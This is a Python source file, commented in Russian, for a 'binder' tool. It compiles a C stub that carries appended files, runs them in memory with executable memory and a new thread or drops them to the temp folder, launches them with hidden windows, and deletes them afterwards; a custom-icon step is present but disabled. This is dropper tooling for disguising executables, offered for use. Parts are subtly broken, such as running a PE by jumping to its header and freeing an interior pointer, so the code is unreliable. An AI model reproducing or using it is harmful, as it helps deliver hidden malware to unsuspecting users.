#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Binder Engine - Склейка файлов любого формата
Поддерживает установку иконки и совместный запуск
"""

import os
import struct
import tempfile
import subprocess
from pathlib import Path
from typing import List, Dict, Optional, Union
import pefile
import shutil
import hashlib
import time


class BinderEngine:
    """Движок для склейки файлов и установки иконок"""
    
    def __init__(self):
        self.files_to_bind = []
        self.icon_path = None
        self.output_name = "binded_file.exe"
        self.execution_mode = "parallel"  # parallel или sequential
        
    def add_file(self, file_path: Union[str, Path], execution_order: int = 0, hidden: bool = False) -> bool:
        """Добавить файл для склейки"""
        try:
            if isinstance(file_path, str):
                file_path = Path(file_path)
            if not file_path.exists():
                return False
                
            file_info = {
                "path": str(file_path),
                "name": file_path.name,
                "size": file_path.stat().st_size,
                "data": file_path.read_bytes(),
                "order": execution_order,
                "hidden": hidden,
                "extension": file_path.suffix.lower()
            }
            
            self.files_to_bind.append(file_info)
            return True
            
        except Exception as e:
            print(f"Ошибка добавления файла: {e}")
            return False
    
    def set_icon(self, icon_path: Union[str, Path]) -> bool:
        """Установить иконку для результата"""
        try:
            if isinstance(icon_path, str):
                icon_path = Path(icon_path)
            if icon_path.exists() and icon_path.suffix.lower() == '.ico':
                self.icon_path = str(icon_path)
                return True
            return False
        except:
            return False
    
    def set_execution_mode(self, mode: str):
        """Установить режим выполнения: parallel или sequential"""
        if mode in ["parallel", "sequential"]:
            self.execution_mode = mode
    
    def bind_files(self, output_path: str) -> Dict:
        """Склеить все файлы в один исполняемый файл"""
        try:
            if not self.files_to_bind:
                return {"success": False, "error": "Нет файлов для склейки"}
            print("[DEBUG] bind_files: output_path:", output_path)
            for f in self.files_to_bind:
                print(f"[DEBUG] bind_files: file: {f['name']} size: {f['size']} order: {f['order']} hidden: {f['hidden']}")
            # Создаём stub (заглушку) для извлечения и запуска
            stub_exe = self._create_stub()
            print("[DEBUG] bind_files: stub_exe:", stub_exe)
            # Добавляем файлы как ресурсы
            result_exe = self._add_files_as_resources(stub_exe, output_path)
            print("[DEBUG] bind_files: result_exe:", result_exe)
            # Контрольная сумма итогового exe
            with open(result_exe, "rb") as f:
                data = f.read()
                md5 = hashlib.md5(data).hexdigest()
                print(f"[DEBUG] bind_files: MD5 of result_exe: {md5}")
            # Дамп конца файла
            with open(result_exe, "rb") as f:
                f.seek(-4096, 2)
                tail = f.read()
                with open("binder_tail.txt", "wb") as dump:
                    dump.write(tail)
                print("[DEBUG] bind_files: last 4KB dumped to binder_tail.txt")
            # Устанавливаем иконку
            if self.icon_path:
                self._set_executable_icon(result_exe, self.icon_path)
            # Автоматически запускаем binder-файл и читаем binder_log.txt
            import subprocess, tempfile, os
            temp_dir = tempfile.gettempdir()
            log_path = os.path.join(temp_dir, "binder_log.txt")
            # Удаляем старый лог
            if os.path.exists(log_path):
                os.remove(log_path)
            print(f"[DEBUG] bind_files: running {result_exe} for stub log...")
            try:
                subprocess.run([result_exe], timeout=10)
            except Exception as e:
                print(f"[DEBUG] bind_files: run error: {e}")
            time.sleep(1)
            if os.path.exists(log_path):
                with open(log_path, "r", encoding="utf-8", errors="ignore") as logf:
                    log_content = logf.read()
                    print("[DEBUG] binder_log.txt:\n" + log_content)
            else:
                print("[DEBUG] binder_log.txt not found after run!")
            return {
                "success": True,
                "output_file": result_exe,
                "files_count": len(self.files_to_bind),
                "total_size": sum(f["size"] for f in self.files_to_bind),
                "execution_mode": self.execution_mode
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _create_stub(self) -> str:
        stub_size = 24064  # Размер stub_exe, вычислять динамически если нужно
        exec_mode = 0 if self.execution_mode == 'sequential' else 1
        stub_template = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define EXECUTION_MODE_PLACEHOLDER {exec_mode}

// --- Логирование ---
void log_message(const char* msg) {{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_slash = strrchr(exe_path, '\\\\');
    if (last_slash) *(last_slash + 1) = 0;
    char log_path[MAX_PATH];
    sprintf(log_path, "%sbinder_log.txt", exe_path);
    FILE* f = fopen(log_path, "a");
    if (f) {{ fprintf(f, "%s\\n", msg); fclose(f); }}
}}

// Структура для информации о файле
typedef struct {{
    char name[256];
    DWORD size;
    int order;
    BOOL hidden;
}} FileInfo;

FileInfo* files = NULL;
int files_count = 0;
BYTE* data_start = NULL;
BYTE* all_data = NULL;

BOOL load_embedded_data() {{
    log_message("[STUB] load_embedded_data: start");
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    HANDLE hFile = CreateFileA(exe_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {{
        log_message("[STUB] ERROR: cannot open exe");
        return FALSE;
    }}
    log_message("[STUB] exe opened");
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size < {stub_size} + 8) {{
        CloseHandle(hFile);
        log_message("[STUB] ERROR: file too small");
        return FALSE;
    }}
    DWORD read_size = file_size - {stub_size};
    SetFilePointer(hFile, {stub_size}, NULL, FILE_BEGIN);
    BYTE* buffer = (BYTE*)malloc(read_size);
    if (!buffer) {{
        CloseHandle(hFile);
        log_message("[STUB] ERROR: malloc failed");
        return FALSE;
    }}
    log_message("[STUB] malloc ok");
    DWORD bytes_read = 0;
    if (!ReadFile(hFile, buffer, read_size, &bytes_read, NULL) || bytes_read != read_size) {{
        CloseHandle(hFile);
        free(buffer);
        log_message("[STUB] ERROR: read failed");
        return FALSE;
    }}
    CloseHandle(hFile);
    log_message("[STUB] read ok");
    // Ищем сигнатуру с начала данных
    int sig_offset = -1;
    for (int i = 0; i < (int)read_size - 8; i++) {{
        if (*(DWORD*)(buffer + i) == 0x12345678) {{
            sig_offset = i;
            break;
        }}
    }}
    if (sig_offset == -1) {{
        log_message("[STUB] ERROR: signature not found");
        free(buffer);
        return FALSE;
    }}
    char dbg[128];
    sprintf(dbg, "[STUB] signature found at offset %d from data start", sig_offset);
    log_message(dbg);
    data_start = buffer + sig_offset;
    // Читаем количество файлов
    files_count = *(DWORD*)(data_start + 4);
    if (files_count <= 0 || files_count > 100) {{
        log_message("[STUB] ERROR: bad files_count");
        free(buffer);
        return FALSE;
    }}
    files = (FileInfo*)malloc(files_count * sizeof(FileInfo));
    if (!files) {{
        log_message("[STUB] ERROR: malloc files");
        free(buffer);
        return FALSE;
    }}
    memcpy(files, data_start + 8, files_count * sizeof(FileInfo));
    all_data = data_start + 8 + files_count * sizeof(FileInfo);
    return TRUE;
}}

BOOL execute_from_memory(int file_index) {{
    if (file_index < 0 || file_index >= files_count || !files) return FALSE;
    
    // Данные файлов находятся последовательно после структур
    BYTE* ptr = all_data;
    for (int i = 0; i < file_index; i++) {{
        ptr += files[i].size;
    }}
    
    // Логируем имя файла для отладки
    char dbg[300];
    sprintf(dbg, "[STUB] executing file: %s (size: %d)", files[file_index].name, files[file_index].size);
    log_message(dbg);
    
    // Проверяем, что это PE файл (MZ signature)
    if (files[file_index].size < 64 || *(WORD*)ptr != 0x5A4D) {{
        log_message("[STUB] not a PE file, skipping in-memory exec");
        return FALSE; // Не PE файл
    }}
    // Выделяем память для выполнения
    LPVOID exec_mem = VirtualAlloc(NULL, files[file_index].size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {{
        log_message("[STUB] VirtualAlloc failed");
        return FALSE;
    }}
    // Копируем данные
    memcpy(exec_mem, ptr, files[file_index].size);
    // Запускаем в памяти
    DWORD thread_id;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, &thread_id);
    if (hThread) {{
        if (EXECUTION_MODE_PLACEHOLDER == 0) {{ // sequential
            WaitForSingleObject(hThread, INFINITE);
        }}
        CloseHandle(hThread);
        log_message("[STUB] in-memory exec: thread created");
        return TRUE;
    }}
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    log_message("[STUB] in-memory exec: thread creation failed");
    return FALSE;
}}

void execute_file(const char* filename, BOOL hidden) {{
    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    if (hidden) {{
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }}
    BOOL result = CreateProcessA(NULL, (LPSTR)filename, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (result) {{
        log_message("[STUB] file executed successfully");
    }} else {{
        log_message("[STUB] file failed: CreateProcess error");
    }}
    if (result && EXECUTION_MODE_PLACEHOLDER == 0) {{ // sequential
        WaitForSingleObject(pi.hProcess, INFINITE);
    }}
    if (result) {{
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
}}

int main() {{
    log_message("[STUB] main started");
    // Загружаем встроенные данные
    if (!load_embedded_data()) {{
        log_message("[STUB] main: load_embedded_data failed");
        return 1;
    }}
    log_message("[STUB] load_embedded_data: success");
    log_message("[STUB] after load_embedded_data, before loop");
    // Сортировка по порядку выполнения
    for (int i = 0; i < files_count - 1; i++) {{
        for (int j = i + 1; j < files_count; j++) {{
            if (files[i].order > files[j].order) {{
                FileInfo temp = files[i];
                files[i] = files[j];
                files[j] = temp;
            }}
        }}
    }}
    // Выполнение файлов в памяти (для PE) или через временные файлы
    char dbg[256];
    for (int i = 0; i < files_count; i++) {{
        sprintf(dbg, "[STUB] launching file %d: %s", i, files[i].name);
        log_message(dbg);
        // Пытаемся выполнить в памяти
        if (!execute_from_memory(i)) {{
            // Если не получилось, создаем временный файл
            char temp_dir[MAX_PATH];
            GetTempPathA(MAX_PATH, temp_dir);
            char full_path[MAX_PATH];
            sprintf(full_path, "%s\\%s", temp_dir, files[i].name);
            // Извлекаем во временный файл
            BYTE* ptr = all_data;
            for (int j = 0; j < i; j++) {{
                ptr += files[j].size;
            }}
            HANDLE hFile = CreateFileA(full_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {{
                DWORD written;
                WriteFile(hFile, ptr, files[i].size, &written, NULL);
                CloseHandle(hFile);
                if (written == files[i].size) {{
                    execute_file(full_path, files[i].hidden);
                    // Удаляем временный файл после запуска
                    DeleteFileA(full_path);
                }} else {{
                    log_message("[STUB] file failed: write error");
                }}
            }} else {{
                log_message("[STUB] file failed: CreateFile error");
            }}
        }} else {{
            sprintf(dbg, "[STUB] execute_from_memory success");
            log_message(dbg);
        }}
    }}
    // Очистка
    if (files) free(files);
    if (all_data) free(all_data);
    log_message("[STUB] main finished");
    return 0;
}}
'''
        
        # Заполняем информацию о файлах
        # exec_mode = 0 if self.execution_mode == "sequential" else 1
        
        stub_code = stub_template.format(exec_mode=exec_mode, stub_size=stub_size)
        
        # Компилируем stub
        stub_c = Path(tempfile.gettempdir()) / "binder_stub.c"
        stub_exe = Path(tempfile.gettempdir()) / "binder_stub.exe"
        
        with open(stub_c, "w", encoding="utf-8") as f:
            f.write(stub_code)
        
        # Компиляция с нужными библиотеками
        compile_cmd = ["gcc", str(stub_c), "-o", str(stub_exe), "-O2", "-s"]
        subprocess.check_call(compile_cmd)
        
        return str(stub_exe)
    
    def _add_files_as_resources(self, stub_exe: str, output_path: str) -> str:
        """Добавить файлы как ресурсы в PE"""
        try:
            # Проверка: stub_exe и output_path не должны совпадать
            if os.path.abspath(stub_exe) == os.path.abspath(output_path):
                raise Exception(f"stub_exe и output_path совпадают! stub_exe={stub_exe}, output_path={output_path}")
            # Копируем stub как основу
            shutil.copy2(stub_exe, output_path)
            print(f"[DEBUG] Копирую stub_exe ({stub_exe}) в output_path ({output_path})")
            size_stub = os.path.getsize(stub_exe)
            size_out = os.path.getsize(output_path)
            print(f"[DEBUG] Размер stub_exe: {size_stub}, размер output_path после копирования: {size_out}")
            if size_stub != size_out:
                raise Exception(f"Размер output_path после копирования не совпадает с stub_exe!")
            # Создаем временный файл с встроенными данными
            temp_data_file = Path(tempfile.gettempdir()) / "binder_data.bin"
            # Записываем данные файлов в бинарный формат (ИСПРАВЛЕНО)
            print("Файлов для биндинга:", len(self.files_to_bind))
            with open(temp_data_file, "wb") as f:
                f.write(struct.pack("<I", 0x12345678))  # Сигнатура
                f.write(struct.pack("<I", len(self.files_to_bind)))  # Количество файлов
                
                for i, file_info in enumerate(self.files_to_bind):
                    print(f"Добавляю файл: {file_info['name']} размер: {file_info['size']}")
                    
                    # Имя файла (фиксированный размер 256 байт)
                    name_bytes = file_info["name"].encode('utf-8')[:255]  # Максимум 255 символов
                    name_padded = name_bytes + b'\x00' * (256 - len(name_bytes))  # Дополняем нулями
                    f.write(name_padded)
                    
                    # Остальные поля
                    f.write(struct.pack("<I", file_info["size"]))
                    f.write(struct.pack("<I", file_info["order"]))  
                    f.write(struct.pack("<I", 1 if file_info["hidden"] else 0))
                
                # Теперь записываем данные файлов
                for file_info in self.files_to_bind:
                    f.write(file_info["data"])
            print("Размер binder_data.bin:", temp_data_file.stat().st_size)
            # Размер до дозаписи
            size_before = os.path.getsize(output_path)
            print(f"[DEBUG] Размер output_path до дозаписи: {size_before}")
            # Объединяем stub и данные
            with open(output_path, "ab") as f:
                with open(temp_data_file, "rb") as data_file:
                    appended = data_file.read()
                    f.write(appended)
            # Размер после дозаписи
            size_after = os.path.getsize(output_path)
            print(f"[DEBUG] Размер output_path после дозаписи: {size_after}")
            if size_after <= size_before:
                raise Exception(f"Размер output_path не увеличился после дозаписи! Было: {size_before}, стало: {size_after}")
            # Удаляем временный файл
            temp_data_file.unlink()
            # === Проверка наличия сигнатуры в конце файла ===
            sig = b'\x78\x56\x34\x12'
            with open(output_path, "rb") as f:
                f.seek(0, 2)
                file_size = f.tell()
                search_size = min(2 * 1024 * 1024, file_size)  # 2 МБ или весь файл
                f.seek(-search_size, 2)
                tail = f.read(search_size)
                idx = tail.rfind(sig)
                if idx == -1:
                    raise Exception(f"Сигнатура 0x12345678 не найдена в последних {search_size} байтах файла {output_path}! Binder повреждён или не записан.")
                else:
                    offset_from_end = search_size - idx
                    print(f"[DEBUG] Сигнатура найдена! Смещение от конца файла: {offset_from_end} байт (абсолютное смещение: {file_size - offset_from_end})")
            return output_path
        except Exception as e:
            print(f"[DEBUG] Ошибка в _add_files_as_resources: {e}")
            raise Exception(f"Ошибка добавления ресурсов: {e}")
    
    def _set_executable_icon(self, exe_path: str, icon_path: str) -> bool:
        """Установить иконку для исполняемого файла (ВРЕМЕННО ОТКЛЮЧЕНО ДЛЯ ОТЛАДКИ)"""
        print(f"[DEBUG] Пропускаю установку иконки для {exe_path} (отключено)")
        return True
    
    def clear_files(self):
        """Очистить список файлов"""
        self.files_to_bind.clear()
    
    def get_files_info(self) -> List[Dict]:
        """Получить информацию о добавленных файлах"""
        return [
            {
                "name": f["name"],
                "size": f["size"],
                "order": f["order"],
                "hidden": f["hidden"],
                "extension": f["extension"]
            }
            for f in self.files_to_bind
        ] 